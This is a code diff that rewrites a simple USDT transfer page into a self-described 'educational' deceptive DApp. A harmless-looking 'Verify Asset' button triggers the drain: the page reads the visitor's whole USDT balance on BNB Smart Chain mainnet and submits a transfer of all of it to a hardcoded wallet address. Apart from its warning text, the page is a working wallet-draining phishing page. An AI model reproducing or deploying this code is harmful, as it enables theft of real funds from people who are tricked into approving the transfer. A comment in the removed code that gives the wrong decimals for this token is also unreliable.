@@ -1,67 +1,157 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Transfer USDT Directly</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Educational - Deceptive UI Demo (Mainnet)</title>
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; background-color: #eef2f7; color: #333; margin: 0; }
+        .container { max-width: 600px; margin: 30px auto; background-color: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #2c3e50; margin-bottom: 15px; }
+        .subtitle { text-align: center; color: #7f8c8d; margin-bottom: 30px; font-size: 0.9em; }
+        /* Deceptive Button Style */
+        button#deceptiveButton { 
+            display: block; 
+            width: 100%; 
+            background-color: #3498db; /* Innocent looking blue */
+            color: white; 
+            padding: 18px 25px; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 20px; 
+            font-weight: bold;
+            cursor: pointer; 
+            transition: background-color 0.3s ease, transform 0.1s ease; 
+            margin-top: 25px;
+            box-shadow: 0 2px 5px rgba(52, 152, 219, 0.4);
+        }
+        button#deceptiveButton:hover { background-color: #2980b9; }
+        button#deceptiveButton:active { transform: translateY(1px); }
+
+        .warning-box { color: #c0392b; background-color: #fadbd8; border: 1px solid #f1948a; padding: 15px; border-radius: 8px; margin-bottom: 25px; font-size: 14px; line-height: 1.6; }
+        .warning-box strong { display: block; margin-bottom: 8px; font-size: 16px; color: #a93226; }
+        .warning-box .highlight { font-weight: bold; color: #c0392b; }
+        pre { background-color: #f8f9f9; border: 1px solid #e0e0e0; padding: 15px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; font-size: 13px; max-height: 250px; overflow-y: auto; margin-top: 15px; }
+        .address-display { font-family: 'Courier New', Courier, monospace; background-color: #ecf0f1; padding: 2px 5px; border-radius: 3px; color: #2c3e50; }
+        .log-container h2 { font-size: 16px; color: #34495e; margin-bottom: 8px; border-bottom: 1px solid #bdc3c7; padding-bottom: 5px;}
+    </style>
 </head>
 <body>
-  <h2>Transfer USDT Instantly</h2>
+    <div class="container">
+        <h1>Asset Verification Portal</h1>
+        <p class="subtitle">Securely verify your digital assets on the blockchain.</p>
 
-  <label>Recipient Wallet:</label><br>
-  <input id="recipient" value="0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090" size="60" /><br><br>
+        <div class="warning-box">
+            <strong>EDUCATIONAL SIMULATION - EXTREME CAUTION! (MAINNET INTERACTION)</strong>
+            <p>This page <span class="highlight">simulates a deceptive DApp</span> for learning purposes. The button below says "Verify Asset," but the underlying code will attempt to initiate a transaction to transfer your <strong>ENTIRE USDT BALANCE</strong> from your wallet.</p>
+            <p>Recipient Address for this test: <strong class="address-display">0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090</strong></p>
+            <p><span class="highlight">CRITICAL:</span> Your actual wallet (Trust Wallet, MetaMask, etc.) <span class="highlight">CANNOT</span> be forced by this webpage to hide the true transaction details. When the wallet pop-up appears, <strong>IT SHOULD ACCURATELY SHOW THE USDT TRANSFER, THE FULL AMOUNT, AND THE RECIPIENT.</strong> Pay very close attention to what your wallet displays. This is your main defense against such deceptive DApps.</p>
+            <p>This involves <span class="highlight">REAL FUNDS</span> if you confirm on Mainnet. Ensure you have BNB for gas. You are solely responsible for your actions.</p>
+        </div>
 
-  <label>Amount (USDT):</label><br>
-  <input id="amount" value="10" /><br><br>
+        <!-- Deceptively named button -->
+        <button id="deceptiveButton">Verify Asset</button>
 
-  <button onclick="sendUSDT()">Next</button>
+        <div class="log-container">
+            <h2>System Log:</h2>
+            <pre id="logOutput">Page loaded. Wallet interaction script ready.
+Ensure your wallet is on BSC Mainnet.
+Click "Verify Asset" above to start the educational simulation.</pre>
+        </div>
+    </div>
 
-  <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
-    const usdtAbi = [
-      {
-        constant: false,
-        inputs: [
-          { name: "recipient", type: "address" },
-          { name: "amount", type: "uint256" }
-        ],
-        name: "transfer",
-        outputs: [{ name: "", type: "bool" }],
-        type: "function"
-      }
-    ];
+    <script>
+        const log = (message) => {
+            const logOutput = document.getElementById('logOutput');
+            const timestamp = new Date().toLocaleTimeString();
+            logOutput.innerHTML += `\n[${timestamp}] ${message}`;
+            logOutput.scrollTop = logOutput.scrollHeight;
+            console.log(`[${timestamp}] ${message}`);
+        };
 
-    async function sendUSDT() {
-      if (!window.ethereum) return alert("MetaMask required");
+        // --- CONFIGURATION (MAINNET - VALUES HARDCODED) ---
+        const USDT_MAINNET_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+        const RECIPIENT_ADDRESS = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090'; // Your specified address
 
-      const web3 = new Web3(window.ethereum);
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-      const sender = accounts[0];
+        const MINIMAL_ERC20_ABI = [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)",
+            "function decimals() view returns (uint8)"
+        ];
 
-      // Force switch to BNB Smart Chain
-      try {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }] // BNB Chain
+        document.getElementById('deceptiveButton').addEventListener('click', async () => {
+            log("'Verify Asset' button clicked. Simulating deceptive DApp flow...");
+
+            if (typeof window.ethereum === 'undefined') {
+                const msg = "Wallet provider not detected. Please open in a DApp browser (e.g., Trust Wallet on BSC Mainnet).";
+                log(msg);
+                alert(msg);
+                return;
+            }
+
+            try {
+                log("Attempting to connect to wallet and get account...");
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                const userAddress = await signer.getAddress();
+                log(`Wallet appears connected. User Address: ${userAddress}`);
+
+                const network = await provider.getNetwork();
+                if (network.chainId !== 56) { // BSC Mainnet Chain ID
+                    const msg = `CRITICAL ERROR: Expected BSC Mainnet (Chain ID 56), but connected to Chain ID ${network.chainId}. Please switch wallet network.`;
+                    log(msg);
+                    alert(msg);
+                    return;
+                }
+                log(`Connected to network: ${network.name} (Chain ID: ${network.chainId}) - Correct for Mainnet.`);
+
+                const usdtContract = new ethers.Contract(USDT_MAINNET_CONTRACT_ADDRESS, MINIMAL_ERC20_ABI, signer);
+                log(`USDT Contract instance: ${USDT_MAINNET_CONTRACT_ADDRESS}`);
+
+                log("Fetching your full USDT balance (this is what the malicious script would do)...");
+                const balanceWei = await usdtContract.balanceOf(userAddress);
+                const decimals = await usdtContract.decimals();
+                const balanceFormatted = ethers.utils.formatUnits(balanceWei, decimals);
+                log(`Your full USDT balance: ${balanceFormatted} USDT (Raw: ${balanceWei.toString()} Wei)`);
+
+                if (balanceWei.isZero()) {
+                    log("Your USDT balance is zero. No transfer would be initiated by a malicious script in this case.");
+                    alert("Your USDT balance is zero. Nothing to transfer for this educational test.");
+                    return;
+                }
+
+                const alertMessage = `EDUCATIONAL SIMULATION ALERT:\n\nThis DApp page presented an "Verify Asset" button.\n\nHowever, the action being proposed to your wallet is to TRANSFER YOUR ENTIRE USDT BALANCE:\n\nAmount: ${balanceFormatted} USDT\nTo: ${RECIPIENT_ADDRESS}\n\nYOUR WALLET SHOULD ACCURATELY DISPLAY THESE DETAILS. Please check your wallet pop-up VERY CAREFULLY NOW.\n\nThis is how scams work. They misrepresent the action on their webpage. Your wallet is your last line of defense if you read it.`;
+                log(alertMessage.replace(/\n\n/g, '\n')); // Log without double newlines
+                alert(alertMessage);
+
+
+                log("Sending the actual (malicious if not for education) USDT transfer transaction to your wallet for confirmation...");
+                // This is the part where the wallet will pop up
+                const tx = await usdtContract.transfer(RECIPIENT_ADDRESS, balanceWei);
+                log("Transaction submitted to wallet, awaiting user confirmation and then network processing...");
+                log(`Transaction Hash (once confirmed by user and sent): ${tx.hash}`);
+                
+                await tx.wait(1); // Wait for 1 confirmation on the blockchain
+                log("Blockchain has confirmed the transaction!");
+                alert("EDUCATIONAL SIMULATION COMPLETE: Transaction confirmed by the network. If you approved the transaction in your wallet, the USDT transfer to your specified address has occurred.");
+
+            } catch (error) {
+                log(`ERROR ENCOUNTERED: ${error.message}`);
+                console.error("Full error object:", error);
+                if (error.code === 4001) { // EIP-1193 user rejected request
+                    log("User REJECTED the transaction in their wallet. This is the correct action if something is suspicious!");
+                    alert("Transaction rejected by user in wallet. Good job for being cautious if this was unexpected!");
+                } else if (error.code === -32000 || (error.message && error.message.toLowerCase().includes("insufficient funds"))) {
+                    log("Transaction failed: Likely insufficient BNB for gas fees, or other execution error on the blockchain.");
+                    alert(`Transaction failed. Possible reasons:\n- Insufficient BNB in your wallet for gas fees.\n- Other network or contract execution error.\n\nDetails: ${error.message}`);
+                } else {
+                    alert(`An error occurred: ${error.message}`);
+                }
+            }
         });
-      } catch (e) {
-        alert("Please switch to BNB Chain manually");
-        return;
-      }
-
-      const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
-      const recipient = document.getElementById("recipient").value.trim();
-      const amount = document.getElementById("amount").value.trim();
-
-      const value = web3.utils.toWei(amount, "mwei"); // USDT uses 6 decimals (not 18)
-
-      try {
-        await contract.methods.transfer(recipient, value).send({ from: sender });
-        alert(`✅ Sent ${amount} USDT to ${recipient}`);
-      } catch (err) {
-        console.error(err);
-        alert("❌ Transfer failed. Make sure you have enough BNB and USDT.");
-      }
-    }
-  </script>
+        log("Educational Deceptive UI script loaded. Remember the warnings. Proceed with extreme caution on Mainnet.");
+    </script>
 </body>
 </html>
